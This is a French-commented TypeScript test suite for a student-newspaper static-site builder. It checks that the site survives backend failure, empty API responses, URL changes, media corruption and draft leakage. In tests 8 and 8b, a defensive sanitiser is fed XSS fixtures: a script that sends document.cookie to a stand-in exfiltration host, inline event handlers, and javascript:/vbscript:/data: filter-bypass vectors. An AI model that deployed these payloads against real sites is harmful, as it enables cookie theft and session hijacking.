/**
 * LE KIOSQUE — test de continuité.
 *
 * C'est LE test du projet. Il ne vérifie pas une fonctionnalité, il vérifie une
 * promesse : « le site reste consultable quoi qu'il arrive au CMS ».
 *
 * Chaque cas correspond à un mode de mort réel d'un journal étudiant :
 *   1. le backend ne répond plus            → le site vit
 *   2. le backend répond « 0 article »      → le build REFUSE de publier
 *   3. plus aucune configuration de backend → le site se reconstruit quand même
 *   4. les URL ont changé                   → aucun lien mort
 *   5. l'archive se corrompt en silence     → on le détecte
 */

import assert from 'node:assert/strict';
import { cp, mkdtemp, readFile, rm, writeFile, mkdir } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';

import { createSourceContext } from '../packages/core/src/source.ts';
import type { Article, ContentBundle } from '../packages/core/src/model.ts';
import { MarkdownSource } from '../packages/adapters/markdown/src/index.ts';
import { build, EmptyingError } from '../packages/pipeline/src/build.ts';
import { sync, BackendUnavailableError } from '../packages/pipeline/src/sync.ts';
import { verifyMediaIntegrity, writeIndex } from '../packages/pipeline/src/mirror.ts';
import { sanitizeHtml } from '../packages/pipeline/src/sanitize.ts';
import type { KiosqueConfig } from '../packages/pipeline/src/config.ts';

const DEMO = path.resolve(fileURLToPath(new URL('../examples/demo-journal', import.meta.url)));
const silent = { info: () => {}, warn: () => {}, error: () => {} };

/** Copie le journal de démonstration dans un dossier jetable. */
async function scratch(): Promise<string> {
  const dir = await mkdtemp(path.join(os.tmpdir(), 'kiosque-'));
  await cp(path.join(DEMO, 'content'), path.join(dir, 'content'), { recursive: true });
  await cp(path.join(DEMO, 'media'), path.join(dir, 'media'), { recursive: true });
  return dir;
}

async function readMirror(root: string): Promise<ContentBundle> {
  const source = new MarkdownSource();
  await source.init({ root }, createSourceContext({ logger: silent }));
  const articles: Article[] = [];
  for await (const a of source.fetchArticles()) articles.push(a);
  return {
    publication: await source.fetchPublication(),
    authors: await source.fetchAuthors(),
    taxonomies: await source.fetchTaxonomies(),
    articles,
    syncedAt: new Date().toISOString(),
  };
}

function configFor(root: string): KiosqueConfig {
  return { root, source: { adapter: 'markdown', options: { root } } };
}

// ---------------------------------------------------------------------------

test('1. le backend est injoignable → le site se construit quand même, entier', async (t) => {
  const root = await scratch();
  t.after(() => rm(root, { recursive: true, force: true }));

  const bundle = await readMirror(root);
  await writeIndex(root, bundle);

  // Un backend qui a expiré pendant l'été : il répond, mais mal.
  const dead = {
    id: 'moribond',
    capabilities: {
      incremental: false, webhooks: false, writeBack: false,
      media: 'urls' as const, taxonomies: [], editorialWorkflow: false,
    },
    async init() {},
    async health() {
      return { ok: false, checkedAt: new Date().toISOString(), reason: 'auth-expired' };
    },
    async fetchPublication(): Promise<never> { throw new Error('injoignable'); },
    async fetchAuthors(): Promise<never> { throw new Error('injoignable'); },
    async fetchTaxonomies(): Promise<never> { throw new Error('injoignable'); },
    async *fetchArticles(): AsyncIterable<Article> { throw new Error('injoignable'); },
    async resolveMedia(): Promise<never> { throw new Error('injoignable'); },
  };

  // sync échoue BRUYAMMENT — c'est voulu, il faut que quelqu'un le sache.
  await assert.rejects(
    () => sync({ config: configFor(root), source: dead as never, logger: silent }),
    BackendUnavailableError,
  );

  // …et le build produit malgré tout le site complet, depuis le miroir seul.
  const out = path.join(root, 'dist');
  const result = await build({ config: configFor(root), bundle, outDir: out, logger: silent });

  assert.equal(result.articles, 2, 'les deux articles publiés doivent survivre');
  const home = await readFile(path.join(out, 'index.html'), 'utf8');
  assert.match(home, /assemblée générale|assembl&#39;?ée/i);
  assert.ok(
    await readFile(path.join(out, 'articles/radio-campus-cinquante-ans/index.html'), 'utf8'),
    'la page d’article doit exister',
  );
});

test('2. le backend répond « 0 article » → le build REFUSE de vider le site', async (t) => {
  const root = await scratch();
  t.after(() => rm(root, { recursive: true, force: true }));

  const bundle = await readMirror(root);
  await writeIndex(root, bundle); // état connu : 2 articles publics

  // Le scénario exact qui tue un journal : l'API répond 200 avec une liste vide.
  const emptied: ContentBundle = { ...bundle, articles: [] };

  await assert.rejects(
    () => build({ config: configFor(root), bundle: emptied, outDir: path.join(root, 'dist'), logger: silent }),
    (err: unknown) => {
      assert.ok(err instanceof EmptyingError, 'doit lever EmptyingError');
      assert.equal(err.previous, 2);
      assert.equal(err.next, 0);
      assert.match(err.message, /--allow-deletions/);
      return true;
    },
  );
});

test('2b. …mais une suppression VOLONTAIRE reste possible', async (t) => {
  const root = await scratch();
  t.after(() => rm(root, { recursive: true, force: true }));

  const bundle = await readMirror(root);
  await writeIndex(root, bundle);

  const result = await build({
    config: configFor(root),
    bundle: { ...bundle, articles: [] },
    outDir: path.join(root, 'dist'),
    allowDeletions: true,
    logger: silent,
  });
  assert.equal(result.articles, 0);
});

test('3. plus aucune configuration de backend → le site se reconstruit', async (t) => {
  const root = await scratch();
  t.after(() => rm(root, { recursive: true, force: true }));

  // On efface toute trace du backend : ni adaptateur valide, ni options, ni index.
  const orphan: KiosqueConfig = { root, source: { adapter: 'un-cms-qui-n-existe-plus' } };

  const bundle = await readMirror(root);
  const out = path.join(root, 'dist');
  const result = await build({ config: orphan, bundle, outDir: out, logger: silent });

  assert.equal(result.articles, 2);
  assert.ok(await readFile(path.join(out, 'feed.xml'), 'utf8'));
});

test('4. les URL ont changé → aucun lien mort, en trois formats', async (t) => {
  const root = await scratch();
  t.after(() => rm(root, { recursive: true, force: true }));

  const bundle = await readMirror(root);
  const out = path.join(root, 'dist');
  await build({ config: configFor(root), bundle, outDir: out, logger: silent });

  const target = 'https://demo.le-radar.ca/articles/radio-campus-cinquante-ans/';

  // (a) page HTML de redirection — la seule qui fonctionne sur GitHub Pages
  const html = await readFile(path.join(out, 'blogue/radio-campus-cinquante-ans/index.html'), 'utf8');
  assert.match(html, new RegExp(`<link rel="canonical" href="${target}">`), 'canonical manquant');
  assert.match(html, /http-equiv="refresh"/, 'meta refresh manquant');
  assert.match(html, /noindex/, 'la page de redirection ne doit pas être indexée');

  // (b) _redirects — Netlify, Cloudflare Pages
  const redirects = await readFile(path.join(out, '_redirects'), 'utf8');
  assert.match(redirects, /\/blogue\/radio-campus-cinquante-ans\/\s+\/articles\/radio-campus-cinquante-ans\/\s+301/);

  // (c) .htaccess — hébergement Apache classique, courant au Québec
  const htaccess = await readFile(path.join(out, '.htaccess'), 'utf8');
  assert.match(htaccess, /Redirect 301 \/blogue\/radio-campus-cinquante-ans\//);

  // Une ancienne URL en .html doit aussi donner un dossier servable.
  assert.ok(
    await readFile(path.join(out, '2026/09/radio-campus-50-ans/index.html'), 'utf8'),
    'l’ancienne URL en .html doit être servie',
  );
});

test('5. l’archive se corrompt en silence → le contrôle d’intégrité le voit', async (t) => {
  const root = await scratch();
  t.after(() => rm(root, { recursive: true, force: true }));

  const source = new MarkdownSource();
  await sync({ config: configFor(root), source: source as never, logger: silent });

  const clean = await verifyMediaIntegrity(root);
  assert.ok(clean.ok, `le miroir fraîchement synchronisé doit être intègre : ${JSON.stringify(clean)}`);

  // Corruption silencieuse : un octet change, la taille ne bouge pas.
  const image = path.join(root, 'media', '2026', '09', 'auditorium.svg');
  const bytes = await readFile(image);
  bytes[Math.floor(bytes.length / 2)] ^= 0xff;
  await writeFile(image, bytes);

  const after = await verifyMediaIntegrity(root);
  assert.equal(after.ok, false, 'la corruption doit être détectée');
  assert.deepEqual(after.corrupted, ['/media/2026/09/auditorium.svg']);

  // Disparition pure et simple.
  await rm(image);
  const gone = await verifyMediaIntegrity(root);
  assert.deepEqual(gone.missing, ['/media/2026/09/auditorium.svg']);
});

test('6. les brouillons ne fuitent jamais vers le site publié', async (t) => {
  const root = await scratch();
  t.after(() => rm(root, { recursive: true, force: true }));

  const bundle = await readMirror(root);
  const out = path.join(root, 'dist');
  await build({ config: configFor(root), bundle, outDir: out, logger: silent });

  for (const file of ['index.html', 'feed.xml', 'sitemap.xml', 'plan-du-site/index.html']) {
    const content = await readFile(path.join(out, file), 'utf8');
    assert.ok(!content.includes('brouillon-budget'), `le brouillon fuit dans ${file}`);
    assert.ok(!content.includes('peigne fin'), `le titre du brouillon fuit dans ${file}`);
  }
  await assert.rejects(
    () => readFile(path.join(out, 'articles/brouillon-budget/index.html'), 'utf8'),
    'aucune page ne doit exister pour un brouillon',
  );
});

test('7. un fork servi dans un sous-dossier produit des liens corrects', async (t) => {
  const root = await scratch();
  t.after(() => rm(root, { recursive: true, force: true }));

  // Le cas par défaut d'un fork : <org>.github.io/le-quorum/
  const forked: KiosqueConfig = {
    ...configFor(root),
    deploy: { basePath: '/le-quorum' },
  };

  const bundle = await readMirror(root);
  const out = path.join(root, 'dist');
  await build({ config: forked, bundle, outDir: out, logger: silent });

  const home = await readFile(path.join(out, 'index.html'), 'utf8');
  assert.match(home, /href="\/le-quorum\/assets\/theme\.css"/, 'la feuille de style doit être préfixée');
  assert.match(home, /href="\/le-quorum\/articles\//, 'les liens d’articles doivent être préfixés');
  assert.ok(
    !/href="\/assets\//.test(home),
    'aucun chemin racine non préfixé ne doit subsister — il casserait le site du fork',
  );

  const article = await readFile(path.join(out, 'articles/assemblee-generale-reconduction/index.html'), 'utf8');
  assert.match(article, /src="\/le-quorum\/media\//, 'les images doivent être préfixées');
});

test('8. le HTML d’un CMS tiers est assaini avant publication', () => {
  const hostile = `
    <p onclick="alert(1)">Texte</p>
    <script>fetch('https://exfiltration.example/'+document.cookie)</script>
    <a href="javascript:alert(1)">piège</a>
    <a href="https://exemple.ca" target="_blank">légitime</a>
    <img src="x.jpg" onerror="alert(1)" alt="photo">
    <iframe src="https://tracker.example"></iframe>
    <style>body{display:none}</style>
    <h2 id="ok" class="ok">Titre conservé</h2>`;

  const clean = sanitizeHtml(hostile);

  assert.ok(!clean.includes('onclick'), 'gestionnaire d’événement conservé');
  assert.ok(!clean.includes('onerror'), 'onerror conservé');
  assert.ok(!clean.includes('<script'), 'script conservé');
  assert.ok(!clean.includes('fetch('), 'le contenu du script doit disparaître, pas seulement la balise');
  assert.ok(!clean.includes('javascript:'), 'URL javascript: conservée');
  assert.ok(!clean.includes('<iframe'), 'iframe conservée');
  assert.ok(!clean.includes('display:none'), 'le contenu du style doit disparaître');

  // Ce qui est légitime doit survivre — un assainisseur trop zélé casse les
  // articles, et une équipe qui voit ses photos disparaître cesse de l'utiliser.
  assert.match(clean, /<h2 id="ok" class="ok">Titre conservé<\/h2>/);
  assert.match(clean, /<a href="https:\/\/exemple\.ca" target="_blank" rel="noopener noreferrer">/);
  assert.match(clean, /<img src="x\.jpg" alt="photo" loading="lazy"/, 'une image relative doit survivre');
});

test('8b. les contournements par caractères de contrôle sont neutralisés', () => {
  // Le navigateur ignore tabulations, sauts de ligne et caractères de contrôle
  // AVANT de résoudre le schéma : un filtre qui ne les retire pas est inutile.
  const vectors = [
    '<a href="java\tscript:alert(1)">x</a>',
    '<a href="java\nscript:alert(1)">x</a>',
    '<a href=" javascript:alert(1)">x</a>',
    '<a href="JaVaScRiPt:alert(1)">x</a>',
    '<a href=" javascript:alert(1)">x</a>',
    '<img src="data:text/html;base64,PHNjcmlwdD4=" alt="x">',
    '<a href="vbscript:msgbox(1)">x</a>',
  ];
  for (const v of vectors) {
    const clean = sanitizeHtml(v);
    assert.ok(!/javascript/i.test(clean), `contournement passé : ${JSON.stringify(v)} → ${clean}`);
    assert.ok(!/vbscript/i.test(clean), `contournement passé : ${JSON.stringify(v)} → ${clean}`);
    assert.ok(!/data:text/i.test(clean), `data:text/html passé : ${JSON.stringify(v)} → ${clean}`);
  }

  // Et les URL parfaitement ordinaires ne doivent PAS être mutilées :
  // c'est le bogue qu'un filtre trop large introduit sans qu'on s'en aperçoive.
  const ok = sanitizeHtml('<a href="https://exemple.ca/a-b_c?x=1&amp;y=2#ancre">lien</a>');
  assert.match(ok, /href="https:\/\/exemple\.ca\/a-b_c\?x=1&amp;y=2#ancre"/, 'URL légitime altérée');
});
